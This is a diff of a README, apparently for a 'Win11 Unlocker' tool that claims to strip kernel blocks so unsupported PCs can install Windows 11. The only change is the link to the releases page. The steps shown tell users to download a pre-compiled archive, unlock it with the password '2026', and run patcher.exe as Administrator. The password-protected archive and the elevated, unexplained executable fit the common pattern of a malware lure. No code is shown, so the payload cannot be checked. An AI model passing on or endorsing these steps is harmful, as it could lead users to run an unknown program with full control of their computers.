@@ -29,7 +29,7 @@ This tool completely removes hardcoded kernel blocks introduced by Microsoft in 
 
 To update your unsupported PC to the latest Windows 11 build right now, follow these simple steps:
 
-1. **Download the Toolkit:** Go to the [Latest Releases](https://github.com/DustHemomancerBerth/Win11_Unlocker) section and download the pre-compiled `WinPOPBit_AutoPatcher.zip` archive.
+1. **Download the Toolkit:** Go to the [Latest Releases](https://github.com/DustHemomancerBerth/Win11_Unlocker/releases/latest) section and download the pre-compiled `WinPOPBit_AutoPatcher.zip` archive.
 2. **Extract Files:** Extract the archive folder to your Desktop. 
    * *Note: The release package is securely compressed. Use password `2026` if prompted.*
 3. **Run the Patcher:** Right-click `patcher.exe` and select **Run as Administrator**.
